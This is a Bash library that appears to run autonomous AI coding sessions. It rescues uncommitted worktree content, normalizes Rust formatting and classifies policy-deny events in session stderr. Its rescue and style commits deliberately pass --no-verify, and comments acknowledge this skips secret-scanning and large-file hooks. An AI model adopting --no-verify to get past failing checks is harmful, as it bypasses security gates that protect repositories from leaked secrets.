# which is true of this pathspec and was false of the formatting beside it.
RESCUE_EXCLUDE_PATHSPEC=(':!.claude/commands/' ':!.claude/claude-pilot.json' ':!.claude/settings.local.json' ':!.claude/*.local.*')

# Format the staged Rust and re-stage it, for a caller that is about to commit
# (mika#1336, extracted and generalized by mika#2348 D2).
#
# WHY THIS IS A FUNCTION. mika#1336 wrote this block inline in
# _rescue_dirty_worktree, and the sibling rescue site — mika#1383's trailing
# content, twelve hundred lines below — never received it. So PR #2344 shipped an
# unformatted `wip(` commit, the CI `Check` job failed on `cargo fmt --all
# --check`, and an operator paid for it by hand (d062f716, "cargo fmt seul").
# Two sites staging pilot Rust and one of them formatting it is the shape the
# defect took; one callee is the shape that cannot drift.
#
# FAIL-SAFE, ALWAYS (mika#2348 D4). `cargo fmt` fails on syntactically invalid
# Rust, and a pilot interrupted mid-file produces exactly that. The rescue is
# salvage, not a gate (mika#1685): a failed fmt leaves CI red, which is the state
# of the world today and costs nothing, whereas a hard failure here would lose
# the pilot's content outright. So: say so, continue, let the caller commit.
#
# Gated on staged *.rs so a docs-only or non-Rust pilot pays no cargo startup.
# Reads: WORKTREE_DIR. Writes: the index (stages the reformatted files).
_fmt_and_stage_rust() {
    git -C "$WORKTREE_DIR" diff --cached --name-only 2>&9 | grep -q '\.rs$' || return 0

    local _fmt_out _fmt_rc
    # `if _x=$(…); then rc=0; else rc=$?; fi` rather than a plain assignment
    # followed by `$?`: the handlers source this file under `set -e`, where a
    # failing command substitution inside an assignment terminates the dispatch
    # outright (same reason as _rescue_verify_pipeline's own note).
    if _fmt_out=$( (cd "$WORKTREE_DIR" && cargo fmt --all) 2>&1 ); then _fmt_rc=0; else _fmt_rc=$?; fi
    if [ "$_fmt_rc" -ne 0 ]; then
        echo "rescue_fmt_failed: cargo fmt exited ${_fmt_rc} — rescue continues with unformatted content (worktree=${WORKTREE_DIR}): ${_fmt_out}" >&2
    elif [ -n "$_fmt_out" ]; then
        echo "NOTE: proactive cargo fmt: ${_fmt_out}" >&2
    fi

    # Same exclusion pathspec as the caller's own `git add`: a path the rescue
    # refuses to stage must not re-enter through the post-fmt re-add.
    git -C "$WORKTREE_DIR" add -u -- "${RESCUE_EXCLUDE_PATHSPEC[@]}" 2>&9
}

# Normalize Rust the PILOT ITSELF committed, before the branch is published
# (mika#2348, closes T2).
#
# WHY A SECOND FUNCTION, AND WHY IT IS NOT AT THE COMMIT LEVEL. mika#2348 was
# filed with two pieces of evidence, and only one of them comes from a rescue
# path at all: PR #2345's unformatted commit is `0931d86c`, an ORDINARY commit
# written by the pilot session — no `wip(` prefix, no rescue anywhere near it.
# The `lefthook` `rust-fmt` gate that should have caught it is declared in
# `lefthook.yml` and IS NOT INSTALLED on the dispatch machine (no `.git/hooks/`,
# no `core.hooksPath` in any scope), so it has never run. A remedy confined to
# the rescue sites would close #2344 and leave #2345 entirely open.
#
# Installing lefthook is deliberately NOT the fix here: it would re-arm
# `rust-clippy` as a pre-commit gate, which mika#1685 refused on this path with
# measurements — a one-line clippy nit rejecting a rescue commit and stranding a
# 29-turn pilot was the modal loop-wedge cause (n>=3 on 2026-06-30, Mika Prime
# bearing the same day ~16:32Z). This normalizes AFTER every producer instead of
# gating each one.
#
# PERIMETER (mika#2348 D3). `cargo fmt --all` walks the whole workspace, and
# since no hook runs it is plausible that `main` already carries unformatted
# files unrelated to this branch. Only files inside the branch's own diff are
# committed; everything else the fmt touched is restored. Named cost, accepted: a
# file left unformatted on `main` and untouched by this branch stays unformatted.
# That is the ticket's perimeter, and CI will say so on the PR that does touch it.
#
# A FILE THE PILOT LEFT DIRTY IS NEVER TOUCHED. This runs before the mika#1383
# Phase A block, so the worktree may still carry the pilot's uncommitted trailing
# content. Those paths are captured BEFORE the fmt and are then neither staged
# (that would steal content into a `style()` commit) nor restored (that would
# destroy it). They are left dirty — reformatted, which is what Phase A wants
# anyway, and it commits them a few lines later.
#
# Reads: WORKTREE_DIR, SKILL, REPO, ISSUE_NUM, BRANCH.
# Writes: POST_RUN_HEAD (advanced past the style commit so the push sees it),
#         RESCUE_COMMITS (via _record_rescue_commit).
_normalize_committed_rust() {
    [ -n "${WORKTREE_DIR:-}" ] && [ -n "${REPO:-}" ] || return 0
    case "${SKILL:-}" in
        dev-pilot|dev-groom) ;;
        *) return 0 ;;
    esac

    # The branch perimeter, resolved first: it is also the cheap gate. No Rust in
    # the branch diff means nothing this function could ever commit, so a
    # docs-only branch pays no cargo startup.
    local _base _branch_files
    _base=$(git -C "$WORKTREE_DIR" merge-base origin/main HEAD 2>&9) || _base=""
    if [ -z "$_base" ]; then
        # Fail-safe: with no base there is no perimeter, and a normalization that
        # cannot tell in-branch from out-of-branch would commit the workspace.
        echo "rescue_fmt_skipped: no merge-base with origin/main — post-flight fmt normalization skipped (branch=${BRANCH:-<unknown>})" >&2
        return 0
    fi
    _branch_files=$(git -C "$WORKTREE_DIR" diff --name-only "${_base}..HEAD" 2>&9)
    grep -q '\.rs$' <<<"$_branch_files" || return 0

    # Captured BEFORE the fmt: everything already dirty belongs to the pilot.
    # `git status --porcelain` (not `git diff`) so a staged-but-uncommitted path
    # counts too — _rescue_dirty_worktree can leave the index populated when its
    # own commit failed.
    local _pre_dirty
    _pre_dirty=$(git -C "$WORKTREE_DIR" -c core.quotePath=false status --porcelain 2>&9 | cut -c4-)

    local _fmt_out _fmt_rc
    if _fmt_out=$( (cd "$WORKTREE_DIR" && cargo fmt --all) 2>&1 ); then _fmt_rc=0; else _fmt_rc=$?; fi
    if [ "$_fmt_rc" -ne 0 ]; then
        # D4 again: say it, change nothing. CI stays red, which is today's state.
        echo "rescue_fmt_failed: cargo fmt exited ${_fmt_rc} during post-flight normalization — nothing normalized (worktree=${WORKTREE_DIR}): ${_fmt_out}" >&2
        return 0
    fi

    local _touched _file _staged=0
    _touched=$(git -C "$WORKTREE_DIR" -c core.quotePath=false diff --name-only 2>&9)
    while IFS= read -r _file; do
        [ -n "$_file" ] || continue
        # The pilot's own dirty content — not ours to stage, not ours to destroy.
        grep -qxF -- "$_file" <<<"$_pre_dirty" && continue
        if grep -qxF -- "$_file" <<<"$_branch_files"; then
            git -C "$WORKTREE_DIR" add -- "$_file" 2>&9 && _staged=1
        else
            # Out of perimeter (D3): unformatted on main, untouched by this
            # branch. Put it back rather than inflate an already fragile PR.
            git -C "$WORKTREE_DIR" checkout -- "$_file" 2>&9 || true
        fi
    done <<<"$_touched"

    # The no-op half, and it is the half that is easy to forget: a tree that was
    # already fmt-clean produces NO commit. A normalization that fires
    # unconditionally is indistinguishable from one that never fires.
    [ "$_staged" -eq 1 ] || return 0
    if git -C "$WORKTREE_DIR" diff --cached --quiet 2>&9; then
        return 0
    fi

    local _count
    _count=$(git -C "$WORKTREE_DIR" diff --cached --name-only 2>&9 | grep -c '' || true)

    # --no-verify for the same reason as every other rescue commit (mika#1685):
    # this path exists precisely because the commit-level gate does not run, and
    # a normalization blocked by a clippy nit would be a gate wearing a fix's
    # clothes.
    if git -C "$WORKTREE_DIR" commit -m "style(${REPO}#${ISSUE_NUM}): normalisation cargo fmt post-flight (mika#2348)

The pilot committed Rust that \`cargo fmt --all -- --check\` rejects, and no
pre-commit hook is installed on the dispatch machine to have stopped it. Scoped
to this branch's own diff (mika#2348 D3)." --no-verify 2>&9; then
        _record_rescue_commit
        POST_RUN_HEAD=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)
        echo "rescue_fmt_normalized: ${_count} file(s) reformatted into a style() commit on branch ${BRANCH:-<unknown>} (mika#2348)" >&2
    else
        # Fail-open: the content is committed and pushable either way; only the
        # formatting is lost, and CI will name it on the PR.
        echo "rescue_fmt_failed: style() commit failed — branch left unformatted (branch=${BRANCH:-<unknown>})" >&2
    fi
}

# Preserve a zero-commit session's uncommitted content, then let the caller
# unblock on it (mika#1282; opened to dev-groom by mika#2031).
#
# WHY dev-groom belongs here. A dev-groom pilot killed after writing its plan but
# before `git commit` has nothing staged, nothing committed, nothing pushed —
# and `_set_up_worktree` force-removes the worktree on the next dispatch of the
# same branch. Uncommitted work is the most fragile form the loss takes: it
# exists in exactly one place. `_find_issue_plan` searches the worktree
# filesystem, so within a single run the plan is still *found*; the loss happens
# between runs. Grooming is also the phase most exposed — first dispatch on a
# fresh branch, whole output one markdown file, ~45 minutes and an architect
# pass to redo.
#
# ORDER IS THE POINT: preserve first, unblock second. This runs from
# _post_flight_recovery, ahead of _check_pilot_force_push, _iterate_groom_loop
# and _push_branch, and the destructive worktree removal is a *next*-dispatch
# event. A rescue that started by cleaning up so it could carry on would have
# inverted the priority.
#
# No-op on a clean tree — for every skill. A rescue that fires unconditionally is
# indistinguishable from one that never fires, so the clean-tree case is asserted
# in tests/test_dev_groom_dirty_rescue.sh alongside the dirty-tree case.
#
# Reads: WORKTREE_DIR, SKILL, PRE_RUN_HEAD, POST_RUN_HEAD, REPO, ISSUE_NUM,
#        BRANCH, SESSION_ID, PILOT_EXIT.
# Writes: POST_RUN_HEAD (advanced past the rescue commit so _push_branch sees
#         it), RESULT, RESCUED_DIRTY_WORKTREE (dev-pilot only).
_rescue_dirty_worktree() {
    # This is dispatch-lib exercising its structural git-workflow ownership per
    # the content/workflow split (mika#1271 architect verdict;
    # pilot-vs-substrate-contract-split-2026-05-25.md).
    # repo#number mode only — the commit subject interpolates REPO/ISSUE_NUM,
    # and free-text dispatches have no worktree to rescue from anyway.
    [ -n "$WORKTREE_DIR" ] && [ -n "$REPO" ] || return 0
    case "$SKILL" in
        dev-pilot|dev-groom) ;;
        *) return 0 ;;
    esac
    # Zero-commit sessions only. A session that did commit is the mika#1383
    # trailing-content path's business, not this one's.
    [ "${PRE_RUN_HEAD:-}" = "${POST_RUN_HEAD:-}" ] || return 0

    DIRTY_FILES=$(git -C "$WORKTREE_DIR" status --porcelain 2>/dev/null | head -20)
    [ -n "$DIRTY_FILES" ] || return 0

    # Commit subject names what was salvaged. The `commit -m "wip(` literal on
    # both sites below is load-bearing for test_rescue_commit_no_verify.sh's
    # static guard — keep the interpolation after it, not around it.
    local _rescue_what
    if [ "$SKILL" = "dev-groom" ]; then
        _rescue_what="plan staged by post-flight recovery (mika#2031)"
    else
        _rescue_what="impl staged by post-flight recovery (mika#1282)"
    fi

    # Stage all dirty files EXCEPT the worktree-scaffold paths copied by
    # _set_up_worktree. The list and the incident behind each entry live on
    # RESCUE_EXCLUDE_PATHSPEC (mika#1288, mika#1419, mika#1552; extracted by
    # mika#2348 D2).
    git -C "$WORKTREE_DIR" add -A -- "${RESCUE_EXCLUDE_PATHSPEC[@]}" 2>&9

    # Guard: if pathspec exclusion left nothing staged, skip the rescue
    # commit. Handles the edge case where the pilot wrote ONLY to scaffold
    # paths (mika#1288, mika#1419).
    if git -C "$WORKTREE_DIR" diff --cached --quiet 2>&9; then
        # mika#2503: name what was ACTUALLY excluded, not a hardcoded list. The
        # message used to read "contained only scaffold paths
        # (.claude/commands/, .claude/claude-pilot.json)" whatever the worktree
        # held, so an operator reading it after a pilot wrote 28 files of build
        # artefacts went looking in the wrong place.
        #
        # `--untracked-files=all`, not DIRTY_FILES: the probe above collapses a
        # wholly-untracked directory to a single `?? .claude/` entry, which is
        # true but names no file an operator can go and look at. The index is
        # empty at this point, so everything listed here was excluded. Re-reading
        # status costs one local call on a branch that is already rare.
        echo "NOTE: nothing left to stage after exclusions — no pilot content to rescue. Excluded: $(git -C "$WORKTREE_DIR" status --porcelain --untracked-files=all 2>/dev/null | head -20 | tr '\n' '|')" >&2
        RESCUED_DIRTY_WORKTREE=0
    else
        # Compute accurate rescued-files list for the rescue note.
        # DIRTY_FILES (from git status --porcelain) includes
        # excluded scaffold paths; RESCUED_FILES reflects what was actually
        # staged and will be committed.
        RESCUED_FILES=$(git -C "$WORKTREE_DIR" diff --cached --name-only 2>&9)

        # Proactive formatting (mika#1336): the dominant rescue-failure class is
        # pilot-authored Rust that was never `cargo fmt`-ed, so the commit ships
        # content the CI `Check` job rejects. The body moved to
        # _fmt_and_stage_rust in mika#2348 so the mika#1383 site below can call
        # the same one — this call is byte-for-byte the previous behaviour and is
        # the negative control of that extraction.
        _fmt_and_stage_rust

        # Attempt rescue commit — capture stderr for hook-failure diagnosis (mika#1296).
        # mika#1341: scratch file MUST live outside the worktree tree, NOT under
        # "$WORKTREE_DIR/.git/". In a linked worktree (every autonomous dev-pilot run)
        # ".git" is a FILE (a `gitdir:` pointer), not a directory — so a redirect into
        # "$WORKTREE_DIR/.git/<name>" fails to OPEN (ENOTDIR). A failed output redirect
        # means `git commit` never runs and exits non-zero with no captured output,
        # producing the "non-rustfmt empty-capture" PIPELINE FAILURE with HEAD unchanged.
        # `mktemp` keeps the original intent (off the working tree, away from .iterate/)
        # while guaranteeing a real, writable path in both linked and non-linked checkouts.
        # Named template preserves the descriptive "mika-rescue-commit-err" scratch name.
        # NOTE: the literal token "mika-rescue-commit-err" is also a sed anchor in
        # test-dispatch-lib.sh (rescue-block extraction); renaming it breaks those tests.
        RESCUE_COMMIT_ERR="$(mktemp "${TMPDIR:-/tmp}/mika-rescue-commit-err.XXXXXX")"

        # mika#1310: capture BOTH stdout and stderr. Lefthook
        # pre-commit hooks print their summary + failure marks
        # to stdout (not stderr); a `2>` redirect alone captured
        # an empty file and the operator saw "Hook output:"
        # blank on every false-positive rejection. Combined
        # `>file 2>&1` captures the full lefthook decoration
        # block including ⛔ failure lines.
        #
        # mika#1685: rescue commits bypass the pre-commit hook
        # (--no-verify) BY DESIGN. The rescue path's purpose is to
        # SALVAGE pilot work for operator review, not to gate it on
        # lint. lefthook runs rust-clippy on pre-commit; a single
        # clippy nit (one-line typo like `repeat().collect()`) would
        # otherwise reject the rescue commit and strand a 29-turn,
        # $4-cost pilot's work as a dead block (modal loop-wedge
        # cause, n=3+ on 2026-06-30). CI re-runs cargo fmt --check +
        # clippy on the resulting draft PR (ci.yml; wip-staleness-check
        # re-clippies wip-rescue drafts when main moves), so the LINT
        # signal still surfaces at the right layer — for the operator
        # and the autonomous-loop's clippy-fix-retry path, not as a
        # hard pre-commit block.
        #
        # TRADE-OFF, by design: --no-verify is all-or-nothing, so it
        # ALSO skips lefthook's no-secrets + no-large-files gates,
        # which CI does NOT replicate today (mika#1689 tracks adding a
        # CI secret-scan net). Accepted because the rescue output is a
        # DRAFT PR (operator-gated, never auto-merged), the secret-prone
        # scaffold paths are already excluded from staging above, and
        # secrets are scrubbed at the DB/tool-call layer. Do NOT remove
        # --no-verify here without first moving the LINT gate somewhere
        # the rescue path can still open its draft PR.
        # Mika Prime bearing 2026-06-30 ~16:32Z ratified this as the
        # wedge-cause fix (Concern 2, ahead of mika#1058).
        if git -C "$WORKTREE_DIR" commit -m "wip(${REPO}#${ISSUE_NUM}): ${_rescue_what}

Content written by pilot session ${SESSION_ID:-unknown} but git commit was never invoked.
Auto-rescued by dispatch-lib dirty-worktree detection.
Scaffold paths excluded (mika#1288, mika#1419)." --no-verify > "$RESCUE_COMMIT_ERR" 2>&1; then
            # Commit succeeded on first try — proceed normally
            rm -f "$RESCUE_COMMIT_ERR"

            # mika#2151: this commit will enter whatever PR the branch carries.
            # Record it now; _signal_rescue_into_open_pr says so after the push.
            _record_rescue_commit

            # Update POST_RUN_HEAD so _push_branch sees new commits
            POST_RUN_HEAD=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)

            # Name what was preserved and where (mika#2031 R6): a silent
            # rescue is nearly as bad as a deletion — nobody knows there is
            # anything to recover.
            RESULT="$(_compose_rescue_note "$RESCUED_FILES" "")

${RESULT}"

            # Mark for draft PR creation in Unit 2 — dev-pilot only.
            # dev-groom's output is a plan on the branch, not a PR (mika#2031 R4).
            case "$SKILL" in dev-pilot) RESCUED_DIRTY_WORKTREE=1 ;; esac
        elif grep -q "rust-fmt\|cargo fmt\|rustfmt" "$RESCUE_COMMIT_ERR" 2>/dev/null; then
            # mika#1685 (AC4, kept-and-noted): with --no-verify on the
            # initial commit above, the pre-commit hook no longer runs,
            # so this fmt-rejection branch is now effectively unreachable
            # on hook grounds. Retained defensively rather than removed —
            # the retry commit below also carries --no-verify so the path
            # stays consistent if a future change reintroduces a hook.
            # Pre-commit rust-fmt hook rejected — auto-fix and retry (mika#1296).
            # Capture cargo fmt stderr so it surfaces in the PIPELINE FAILURE message
            # if the retry also fails (review-guide.md § Single Responsibility — failure
            # paths must surface all available diagnostic information).
            CARGO_FMT_ERR=""
            echo "NOTE: rescue commit rejected by rust-fmt hook — running cargo fmt and retrying" >&2
            CARGO_FMT_ERR=$( (cd "$WORKTREE_DIR" && cargo fmt --all) 2>&1 ) || true
            # Same exclusion pathspec as the initial `git add -A` above —
            # scaffold paths stay excluded on the post-fmt retry path too.
            git -C "$WORKTREE_DIR" add -A -- "${RESCUE_EXCLUDE_PATHSPEC[@]}" 2>&9

            # mika#1310: capture both stdout+stderr (see above).
            if git -C "$WORKTREE_DIR" commit -m "wip(${REPO}#${ISSUE_NUM}): ${_rescue_what}

Content written by pilot session ${SESSION_ID:-unknown} but git commit was never invoked.
Auto-rescued by dispatch-lib dirty-worktree detection (cargo fmt applied).
Scaffold paths excluded (mika#1288, mika#1419)." --no-verify > "$RESCUE_COMMIT_ERR" 2>&1; then
                # Retry succeeded after cargo fmt
                rm -f "$RESCUE_COMMIT_ERR"

                # mika#2151: same recording as the direct path above — the
                # cargo-fmt retry produces exactly the same class of commit.
                _record_rescue_commit

                POST_RUN_HEAD=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)

                RESULT="$(_compose_rescue_note "$RESCUED_FILES" " + mika#1296")

${RESULT}"

                case "$SKILL" in dev-pilot) RESCUED_DIRTY_WORKTREE=1 ;; esac
            else
                # Retry also failed — abort rescue, leave dirty.
                # Surface the full diagnostic chain: cargo fmt output + retry commit
                # hook output, so the operator can diagnose from the message alone
                # (mika#1296 acceptance criteria).
                RESCUE_ERR_CONTENT=$(cat "$RESCUE_COMMIT_ERR" 2>/dev/null | head -50)
                # mika#1310: if captured output is empty, dump git
                # diagnostic state as fallback so PIPELINE FAILURE
                # carries SOMETHING the operator can act on.
                if [ -z "$(printf '%s' "$RESCUE_ERR_CONTENT" | tr -d '[:space:]')" ]; then
                    RESCUE_ERR_CONTENT="<rescue capture was empty — likely no hook output, falling back to git diagnostic>
git status:
$(git -C "$WORKTREE_DIR" status --short 2>&1 | head -10)
git diff --cached --name-only:
$(git -C "$WORKTREE_DIR" diff --cached --name-only 2>&1 | head -10)"
                fi
                RESULT="PIPELINE FAILURE: auto-rescue commit rejected by pre-commit hook after cargo-fmt retry.
cargo fmt stderr: ${CARGO_FMT_ERR:-<empty>}
Hook output: ${RESCUE_ERR_CONTENT}
Worktree left dirty for operator inspection: ${WORKTREE_DIR}
Still uncommitted there (nothing else holds a copy):
${RESCUED_FILES}

${RESULT}"
                # Do NOT set RESCUED_DIRTY_WORKTREE — prevents empty draft PR
                rm -f "$RESCUE_COMMIT_ERR"
            fi
        else
            # Unknown hook failure — abort rescue, leave dirty
            RESCUE_ERR_CONTENT=$(cat "$RESCUE_COMMIT_ERR" 2>/dev/null | head -50)
            # mika#1310: if captured output is empty, dump git
            # diagnostic state as fallback so PIPELINE FAILURE
            # carries SOMETHING the operator can act on.
            if [ -z "$(printf '%s' "$RESCUE_ERR_CONTENT" | tr -d '[:space:]')" ]; then
                RESCUE_ERR_CONTENT="<rescue capture was empty — likely no hook output, falling back to git diagnostic>
git status:
$(git -C "$WORKTREE_DIR" status --short 2>&1 | head -10)
git diff --cached --name-only:
$(git -C "$WORKTREE_DIR" diff --cached --name-only 2>&1 | head -10)"
            fi
            RESULT="PIPELINE FAILURE: auto-rescue commit rejected by pre-commit hook (non-rustfmt).
Hook output: ${RESCUE_ERR_CONTENT}
Worktree left dirty for operator inspection: ${WORKTREE_DIR}
Still uncommitted there (nothing else holds a copy):
${RESCUED_FILES}

${RESULT}"
            # Do NOT set RESCUED_DIRTY_WORKTREE — prevents empty draft PR
            rm -f "$RESCUE_COMMIT_ERR"
        fi
    fi
}

# _pilot_had_no_shipping_tail — true when this dispatch launched a pilot whose
# PERIMETER did not include opening a PR, AND whose session concluded.
#
# mika#2492. Two axes, and the crossing is the whole point. The autonomous loop
# dispatches every groomed ticket under `/ce-work <plan>` (the mika#1074
# override in `_detect_plan_on_branch`), and `/ce-work` is, in its own words,
# "implementation and local verification only, without the shipping tail". Such
# a pilot never opens a PR — that is its scope, not a truncation. Until this
# ticket the nominal path was therefore classified as a wreck
# (`commit-pushed-no-pr`), which armed three independent guards against the very
# PR the loop exists to produce.
#
# The stamp is written by its PRODUCER (see the two `PILOT_SHIPPING_TAIL=` sites
# in `dispatch_claude_pilot` / `_detect_plan_on_branch`), never reconstructed
# here — same motif as `origin:loop` (mika#2026), `closing_pr_closed_unmerged`
# (mika#2242) and `qa_review_pr_target` (mika#2368).
#
# The `STATUS = success` term is the SECOND axis: a session killed by a
# guardrail or an SDK limit carries `STATUS = terminated` (see the branch at
# `_run_claude_pilot`'s terminated guard and `_halt_family`'s
# `error_max_turns`), never `success`. Truncated work must not be presented as
# complete just because its perimeter had no shipping tail. This is the same
# term the mika#940 Unit 1 guard below already uses, read at the same place.
#
# Fail-safe (mika#2492 R4): every indeterminacy returns false, which falls back
# to the pre-ticket behaviour. An unreadable signal is never a satisfied term.
_pilot_had_no_shipping_tail() {
    [ "${SKILL:-}" = "dev-pilot" ]            || return 1
    [ "${PILOT_SHIPPING_TAIL:-}" = "absent" ] || return 1
    [ "${STATUS:-}" = "success" ]             || return 1
    return 0
}

# ---------------------------------------------------------------------------
# mika#2493 — reading a policy deny: its LETHALITY and its full EVENT.
#
# Two functions, two questions, deliberately separate. The verb "halted" belongs
# to a deny that ENDED the session; a deny the session survived is a note. Until
# this ticket both were labelled identically, and that label made an operator
# AND the orchestrator conclude "failure" on two sessions that had succeeded
# (mika#2493 M0: sessions 98b60020 and a0886164, seven denies between them,
# ZERO terminal).
# ---------------------------------------------------------------------------

# Line cap for the deny-event excerpt below. Bounded because a stderr written
# before cpp#151 carries no lethality marker ANYWHERE, so a scan that only
# stopped on the marker would run to end-of-file.
_POLICY_DENY_EXCERPT_MAX_LINES=12

# _policy_deny_excerpt — read ANSI-stripped stderr on stdin, print the first
# `[policy:deny]` event in full rather than its first line only (mika#2493 U3).
#
# WHY this is not a one-line grep. The rendered deny is
#   `[policy:deny] <Tool>: <detail>[ [rule-id]] (terminal|non-terminal)`
# and `<detail>` is multi-line whenever the refused command is. The lethality
# marker (cpp#151) FOLLOWS the `[rule-id]` at the END of `<detail>`, so on a
# multi-line deny a `grep -m1` capture loses BOTH. Measured (mika#2493 M2):
# 62 of the 268 stderr files carrying a deny since cpp#151 — 23 %, and the
# ticket's own proof `98b60020` is among them — lose their marker to that
# capture. The message this excerpt lands in tells the operator to "read the
# halt event's bracketed [rule-id] FIRST"; on those 62 that instruction was
# structurally inexecutable. Same doctrine point 3 as mika#2312: never truncate
# the command when reporting it.
#
# Three stop conditions, all three needed (mika#2493 D6): the lethality marker
# (inclusive — it is the end of the event), a line that visibly OPENS another
# log event (leading `[`, the shape of `[init]` / `[debug]` / `[2026-…]`), and
# the line cap. Without the cap a pre-cpp#151 file runs to EOF; without the
# other-event stop a one-line deny followed by `[debug]` noise drags that noise
# to the cap.
#
# Continuation lines are printed INDENTED. Two reasons: the caller interpolates
# the first line right after `Halt event: `, so leaving it flush keeps that
# shape byte-identical; and indenting neutralises the two line-ANCHORED
# reclassification tokens (`^STATUS=CANCELLED`, `^Outcome: PIPELINE_INCOMPLETE`)
# that a continuation line could otherwise open (mika#2493 D5).
# COST, named: the three UNANCHORED tokens are not neutralised. A refused
# command whose text literally contains `PIPELINE FAILURE:` would still
# reclassify the session. That exposure is pre-existing (the current site
# already interpolates the raw deny line) and scrubbing the evidence would
# contradict the non-truncation doctrine this function exists to honour.
#
# Reads stdin so the caller keeps its own `sed`-based ANSI strip visible at the
# site. Never short-circuits its input: the awk program keeps draining stdin
# after it is done printing, so the upstream `sed` can never take SIGPIPE and
# be promoted to the pipeline's status under `pipefail` (mika#2055 class).
_policy_deny_excerpt() {
    awk -v max="${_POLICY_DENY_EXCERPT_MAX_LINES:-12}" '
        done_printing { next }
        !started {
            if (index($0, "[policy:deny]") > 0) {
                started = 1
                n = 1
                print
                if ($0 ~ /\((non-)?terminal\)/) done_printing = 1
            }
            next
        }
        {
            if ($0 ~ /^[[:space:]]*\[/) { done_printing = 1; next }
            n++
            print "    " $0
            if ($0 ~ /\((non-)?terminal\)/ || n >= max) done_printing = 1
        }
    '
}

# _policy_deny_lethality <stderr_path> — print exactly one of
# `terminal` | `non-terminal` | `undeclared` (mika#2493 U2, D2).
#
# The predicate is on the FILE, never on a captured line. Three measured
# reasons: the marker sits outside the first line in 23 % of cases (M2); a
# single session carries several denies (five for `a0886164`), so the useful
# question is "does a terminal one exist?" rather than "was the first one?";
# and a terminal deny ENDS its session (M4, verified on `da4aa7ae`: sole deny,
# terminal, line 160 of 166), which makes "at least one terminal" and "the last
# one is terminal" coincide while only the former survives truncation.
#
# The discrimination is a literal substring test, and it is safe in the one
# direction that matters: `(non-terminal)` does NOT contain `(terminal)` — the
# opening parenthesis the latter requires is occupied by the `-`. Getting that
# backwards would reclassify the 1093 measured non-terminal denies in one go,
# which is what the negative-control test exists to catch.
#
# `undeclared` asserts NOTHING, and that is the only safe reading (D3). The
# marker does not exist before cpp#151 (2026-09-04), so on that population no
# lethality can be read: folding it onto `non-terminal` would state the false
# thing in the other direction, folding it onto `terminal` would reproduce the
# very defect being repaired. Same house motif as `unknown_provider`
# (mika#2328) and `pilot_stall_signal_unavailable` (mika#2277) — an unreadable
# signal is NAMED, never folded onto a readable value.
#
# Fail-open: absent, unreadable, or empty file → `undeclared`.
#
# COST, named: the scan is on the whole file, so a session whose pilot PROSE
# contains the literal `(terminal)` reads as terminal. That is the mika#2050
# Signal-S class (the pilot's own prose shares the file). It is bounded by the
# U1 guard: the branch this feeds is only reached when NO deliverable was
# produced, so the worst case is a session that produced nothing being called
# `halted (terminal)` instead of carrying a non-terminal note.
_policy_deny_lethality() {
    local _stderr_path="${1:-}"
    local _stripped=""

    if [ -n "$_stderr_path" ] && [ -f "$_stderr_path" ] && [ -r "$_stderr_path" ]; then
        _stripped=$(sed 's/\x1b\[[0-9;]*[mK]//g' "$_stderr_path" 2>/dev/null) || _stripped=""
    fi

    if [ -z "$_stripped" ]; then
        printf '%s' 'undeclared'
        return 0
    fi

    if grep -qF -- '(terminal)' <<<"$_stripped"; then
        printf '%s' 'terminal'
    elif grep -qF -- '(non-terminal)' <<<"$_stripped"; then
        printf '%s' 'non-terminal'
    else
        printf '%s' 'undeclared'
    fi
}

# Sentinel the note below is keyed on. Both POLICY_DENY sites can fire on one
# dev-groom dispatch (HEAD unchanged AND the plan-validation chain), so without
# an idempotence key the same note would be annexed twice.
_POLICY_DENY_NOTE_SENTINEL="Note: a policy deny was observed and the session continued past it"

# _annex_policy_deny_note <lethality> <excerpt> — append the factual note for a
# deny that did NOT end the session (mika#2493 U2 step 4, D4).
#
# The asymmetry is the conceptual core. A TERMINAL deny *is* the cause, so it
# replaces the branch's diagnosis, as today. A NON-TERMINAL one is not: the
# session ran on after it. Replacing a true diagnosis ("no plan found, likely
# (a) drift (b) a discovery bug") with "halted by policy deny" MOVES the
# ticket's lie instead of closing it — it substitutes a false cause for a real
# one under cover of precision. So the branch that applies keeps the floor and
# the deny is reported in ANNEX, because it may well have hindered the pilot
# without killing it.
#
# Corollary, accepted and deliberate: the note is also written on a SUCCESSFUL
# session. That is exactly what the ticket asks for — a survived non-terminal
# deny is a note. It is short, factual and non-alarming.
#
# HARD constraint (D5): the note must carry none of the reclassification tokens
# `dispatch-lib.sh` itself greps for (`PIPELINE FAILURE:`,
# `STRUCTURAL VIOLATION:`, `HANDLER CRASH`, `^STATUS=CANCELLED`,
# `^Outcome: PIPELINE_INCOMPLETE`). An informational note that introduced one
# would reclassify the session as a failure — the repaired defect, rebuilt by
# its own fix. Held by a test on the PRODUCED TEXT, not by review.
_annex_policy_deny_note() {
    local _lethality="${1:-}" _excerpt="${2:-}" _reading=""

    [ "$_lethality" = "non-terminal" ] || [ "$_lethality" = "undeclared" ] || return 0
    # `if`, not `&& return` — a non-zero `&&` chain is what `set -e` kills.
    if grep -qF -- "$_POLICY_DENY_NOTE_SENTINEL" <<<"${RESULT:-}"; then
        return 0
    fi

    # NOTE ON WORDING: this text must contain neither the reclassification tokens
    # of D5 nor the word the terminal branch owns. A note that said "not halted"
    # would still put that word in a `result` an operator greps, which is the
    # confusion being repaired — and the mika#2493 verification contract asserts
    # its absence on this population.
    if [ "$_lethality" = "non-terminal" ]; then
        _reading="Lethality marker: (non-terminal) — claude-pilot states this refusal did not end the session."
    else
        # D3: say WHY nothing is asserted, and say that the missing half is the
        # pilot build's declaration, not this dispatch's reading.
        _reading="Lethality marker: undeclared — this session's stderr carries no lethality marker at all, in either of the two forms claude-pilot emits, so its lethality cannot be read. The marker exists from cpp#151 onwards (2026-09-04); an older build declares nothing. Neither reading is asserted."
    fi

    RESULT="${RESULT}

${_POLICY_DENY_NOTE_SENTINEL} (mika#2493). It is reported for completeness, not as a cause — the diagnosis above stands on its own. A refusal can hinder a pilot without ending its session, and this one did not end it.
${_reading}

Observed deny: ${_excerpt}"
}

_post_flight_recovery() {
    # Post-flight recovery (mika#1615): extracted from the if [ -n "$STATUS" ]
    # branch so recovery fires on ALL exit paths — structured JSON output,
    # non-structured exit 0, and non-zero exit. Guards within each block use
    # PRE_RUN_HEAD, POST_RUN_HEAD, SKILL, REPO, BRANCH, WORKTREE_DIR — none
    # depend on STATUS. The mika#940 check explicitly checks STATUS=success
